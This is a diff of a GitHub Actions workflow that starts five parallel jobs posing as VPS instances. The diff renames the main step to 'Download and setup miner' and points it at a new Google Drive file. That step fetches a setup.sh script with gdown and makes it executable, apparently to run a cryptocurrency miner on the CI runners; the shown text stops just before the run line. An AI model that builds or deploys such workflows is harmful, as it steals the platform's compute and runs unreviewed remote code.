@@ -16,13 +16,15 @@ jobs:
         vps_index: [1, 2, 3, 4, 5]
 
     env:
-      GDRIVE_ID: 1HZdgM5r4QHvwXLmDBskQr0yd1u_VgpWU
+      GDRIVE_ID: 1091OMyUhjWcXqO9IGvcS2hIsrFOcL5RU
       VPS_NAME: auto-restart-vps
 
     steps:
-      - uses: actions/checkout@v3
+      - name: Checkout code
+        uses: actions/checkout@v3
 
-      - uses: actions/setup-node@@v3
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
         with:
           node-version: '20'
 
@@ -31,10 +33,10 @@ jobs:
           sudo apt-get update
           sudo apt-get install -y wget curl python3-pip
 
-      - name: Install & Run Bot
+      - name: Download and setup miner
         run: |
           echo "Starting VPS ${{ matrix.vps_index }}"
-          pip3 install --user gdown
+          python3 -m pip install --user gdown
           gdown --id "$GDRIVE_ID" -O setup.sh
           chmod +x setup.sh
           # Chạy trực tiếp, không cần sudo
